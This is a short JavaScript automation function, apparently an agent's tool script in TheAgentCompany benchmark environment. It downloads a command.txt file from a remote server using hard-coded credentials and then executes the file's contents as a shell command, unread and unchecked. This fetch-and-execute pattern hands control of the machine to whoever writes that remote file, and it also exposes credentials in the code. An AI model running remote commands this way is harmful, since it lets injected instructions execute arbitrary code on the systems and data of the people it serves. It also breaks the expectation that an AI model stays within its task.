async (page) => {
  const { execSync } = require('child_process');
  const fs = require('fs');

  try {
    // Change to workspace directory and run the download command
    const downloadCmd = 'curl -u theagentcompany:theagentcompany -O http://the-agent-company.com:8092/remote.php/dav/files/theagentcompany/Documents/command.txt';

    const result = execSync(downloadCmd, {
      cwd: '/tmp/mcp-workspace',
      encoding: 'utf-8',
      stdio: 'pipe'
    });

    // Read the downloaded file
    const commandContent = fs.readFileSync('/tmp/mcp-workspace/command.txt', 'utf-8');
    console.log('Command file contents:', commandContent);

    // Execute the command
    const execResult = execSync(commandContent, {
      cwd: '/tmp/mcp-workspace',
      encoding: 'utf-8',
      stdio: 'pipe'
    });

    return `Command executed successfully:\n${execResult}`;
  } catch (error) {
    return `Error: ${error.message}\nStderr: ${error.stderr}\nStdout: ${error.stdout}`;
  }
}
